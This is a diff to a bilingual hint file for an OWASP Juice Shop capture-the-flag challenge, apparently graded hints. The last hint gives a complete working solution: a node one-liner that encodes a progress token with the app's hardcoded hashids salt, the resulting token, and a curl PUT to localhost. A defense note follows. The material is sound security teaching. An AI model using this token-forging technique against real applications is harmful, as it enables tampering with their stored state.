@@ -10,18 +10,21 @@ hints:
       Donc le challenge cible le restore-progress
       mecanisme. Hint #2 : "Find out how saving
       and restoring progress is done behind the
-      scenes" - investigate /rest/continue-code/
-      apply/:continueCode endpoint.
+      scenes". Ou ta progression est-elle
+      conservee entre deux sessions (cookies,
+      requetes au chargement du score-board) ?
     text_en: |
       Official OWASP hint #1: "You need to trick
       the hacking progress persistence feature".
       So challenge targets restore-progress
       mechanism. Hint #2: "Find out how saving
       and restoring progress is done behind the
-      scenes" - investigate /rest/continue-code/
-      apply/:continueCode endpoint.
+      scenes". Where is your progress kept
+      between sessions (cookies, requests made
+      when the score board loads)?
     pedagogical_intent: |
-      Activate persistence mechanism reflex.
+      Activate the persistence-mechanism reflex by observation,
+      without naming the endpoint.
 
   N2:
     cost_pct: 10
@@ -70,110 +73,56 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Source serveur
-      verifiee (routes/restoreProgress.ts:18) :
-      ```js
-      const hashidsAlphabet = 'abcdefghijklmnop
-        qrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-        1234567890';
-      const hashids = new Hashids('this is my
-        salt', 60, hashidsAlphabet);
-      ```
-      Le salt est literalement `'this is my
-      salt'`. Le min length est 60. Tu peux
-      reproduire localement avec hashids npm
-      package.
+      Code serveur (routes/restoreProgress.ts, lignes 12 a 25) :
+        const hashidsAlphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+        const hashids = new Hashids('this is my salt', 60, hashidsAlphabet)
+        const ids = hashids.decode(continueCode)
+        if (... && ids.includes(999)) solve(continueCodeChallenge)
+      Le sel est une phrase litterale, en clair dans le code.
+      L'endpoint est PUT /rest/continue-code/apply/:continueCode
+      (server.ts) : un GET ne passe pas par ce handler. Il te reste a
+      encoder [999] avec les memes parametres.
     text_en: |
-      Verified server
-      source (routes/restoreProgress.ts:18):
-      ```js
-      const hashidsAlphabet = 'abcdefghijklmnop
-        qrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-        1234567890';
-      const hashids = new Hashids('this is my
-        salt', 60, hashidsAlphabet);
-      ```
-      Salt is literally `'this is my salt'`.
-      Min length is 60. You can reproduce
-      locally with hashids npm package.
+      Server code (routes/restoreProgress.ts, lines 12 to 25):
+        const hashidsAlphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+        const hashids = new Hashids('this is my salt', 60, hashidsAlphabet)
+        const ids = hashids.decode(continueCode)
+        if (... && ids.includes(999)) solve(continueCodeChallenge)
+      The salt is a literal phrase, in clear text in the code.
+      The endpoint is PUT /rest/continue-code/apply/:continueCode
+      (server.ts): a GET does not reach this handler. All that is
+      left is to encode [999] with the same parameters.
     pedagogical_intent: |
-      Reveal exact salt + parameters.
+      Give the exact parameters (salt, length, alphabet on one line)
+      and the HTTP verb.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Workflow complet :
-      1. Install hashids :
-         `npm install hashids`
-      2. Generer le continueCode pour challenge
-         #999 :
-         ```js
-         const Hashids = require('hashids/cjs');
-         const alphabet = 'abcdefghijklmnopqrstu
-           vwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-           1234567890';
-         const hashids = new Hashids('this is
-           my salt', 60, alphabet);
-         const continueCode = hashids.encode(
-           [999]);
-         console.log(continueCode);
-         // -> string of 60+ chars
-         ```
-      3. Submit le continueCode :
-         `curl http://localhost:3000/rest/
-         continue-code/apply/<continueCode>`.
-      4. Le serveur :
-         (a) hashids.decode(continueCode) ->
-             [999]
-         (b) `ids.includes(999)` = true
-         (c) challengeUtils.solve(challenges.
-             continueCodeChallenge) -> challenge
-             solve auto.
-      Source canonique : routes/restoreProgress.
-      ts:18-25 + hashids docs.
-      Defense canonique : (a) JWT signed RS256
-      avec solvedChallenges claim. (b) HMAC-SHA256
-      sur continueCode avec crypto-random
-      secret. (c) Server-side state persistance
-      via DB Progress model. (d) hashids
-      uniquement comme cosmetic short-encoding,
-      JAMAIS comme security primitive.
+      Solution (verifiee en recette sur Juice Shop 19.2.1) :
+        npm install hashids
+        node -e "const H=require('hashids/cjs');console.log(new H('this is my salt',60,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890').encode(999))"
+        # -> 69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
+        curl -s -X PUT http://127.0.0.1:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
+      Reponse 200, challenge resolu. Le meme code envoye en GET
+      renvoie une erreur 500 sans resoudre.
+      Defense : hashids est un encodage reversible, pas une
+      protection ; un sel public ou devinable le rend trivial. Pour
+      un jeton de progression, signer le contenu cote serveur (HMAC
+      avec un secret aleatoire hors du code) ou garder l'etat en base
+      et ne remettre au client qu'un identifiant opaque.
     text_en: |
-      Full workflow:
-      1. Install hashids:
-         `npm install hashids`
-      2. Generate continueCode for challenge
-         #999:
-         ```js
-         const Hashids = require('hashids/cjs');
-         const alphabet = 'abcdefghijklmnopqrstu
-           vwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-           1234567890';
-         const hashids = new Hashids('this is
-           my salt', 60, alphabet);
-         const continueCode = hashids.encode(
-           [999]);
-         console.log(continueCode);
-         // -> string of 60+ chars
-         ```
-      3. Submit continueCode:
-         `curl http://localhost:3000/rest/
-         continue-code/apply/<continueCode>`.
-      4. Server:
-         (a) hashids.decode(continueCode) ->
-             [999]
-         (b) `ids.includes(999)` = true
-         (c) challengeUtils.solve(challenges.
-             continueCodeChallenge) -> challenge
-             auto solves.
-      Canonical source: routes/restoreProgress.
-      ts:18-25 + hashids docs.
-      Canonical defense: (a) RS256-signed JWT
-      with solvedChallenges claim. (b) HMAC-
-      SHA256 on continueCode with crypto-random
-      secret. (c) Server-side state persistence
-      via DB Progress model. (d) hashids only as
-      cosmetic short-encoding, NEVER as security
-      primitive.
+      Solution (verified during testing on Juice Shop 19.2.1):
+        npm install hashids
+        node -e "const H=require('hashids/cjs');console.log(new H('this is my salt',60,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890').encode(999))"
+        # -> 69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
+        curl -s -X PUT http://127.0.0.1:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
+      Response 200, challenge solved. The same code sent with GET
+      returns a 500 error without solving.
+      Defense: hashids is a reversible encoding, not a protection; a
+      public or guessable salt makes it trivial. For a progress
+      token, sign the content server-side (HMAC with a random secret
+      kept out of the code) or keep the state in the database and
+      give the client only an opaque identifier.
     pedagogical_intent: |
-      Solution complete + Node script + defense.
+      Full solution: verified encode and PUT, GET pitfall, defense.
